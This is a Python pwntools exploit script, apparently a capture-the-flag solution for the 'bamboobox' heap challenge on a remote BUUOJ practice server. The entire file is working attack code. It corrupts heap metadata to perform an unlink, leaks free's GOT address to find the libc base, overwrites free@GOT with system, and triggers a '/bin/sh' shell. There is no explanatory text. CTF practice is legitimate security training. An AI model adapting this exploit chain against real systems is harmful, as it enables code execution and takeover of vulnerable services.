from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="debug"
#libc = ELF("./libc-2.23.so")
#p = process("./bamboobox")
p = remote("node3.buuoj.cn","25254")

def dbg():
    gdb.attach(p)
    pause()
def choice(num):
	p.sendlineafter(":",str(num))

def add(size,text):
    choice(2)
    p.sendlineafter(":",str(size))
    p.sendafter(":",text)

def edit(id,size,text):
    choice(3)
    p.sendlineafter(":",str(id))
    p.sendlineafter(":",str(size))
    p.sendafter(":",text)

def delete(id):
    choice(4)
    p.sendlineafter(":",str(id))

def show():
    choice(1)

magic = 0x400D49
free_got = 0x602018

add(0x100,"a"*0x10) #0 
add(0x30,"a"*0x10) #1
add(0x80,"a"*0x80) #2
add(0x80,"/bin/sh\x00") #3

payload = p64(0) + p64(0x20) +  p64(0x6020c0) + p64(0x6020c0+0x8) + p64(0x20) + "aaaaaaaa" + p64(0x30) + p64(0x90)

edit(1,len(payload),payload)
delete(2)

payload = p64(0) + p64(0) +  p64(0x100) + p64(free_got) 

edit(1,len(payload),payload)
show()

p.recvuntil("1 : ")
free_addr = u64(p.recv(6).ljust(8,"\x00"))
libc = LibcSearcher("free",free_addr )
libc_base = free_addr - libc.dump("free")
system = libc_base + libc.dump("system")

log.info("system_addr:%x",system)

#libc_base = u64(p.recv(6).ljust(8,"\x00")) - libc.sym["free"]
#system = libc_base + libc.sym["system"]

edit(1,0x8,p64(system))
delete(3)

p.interactive()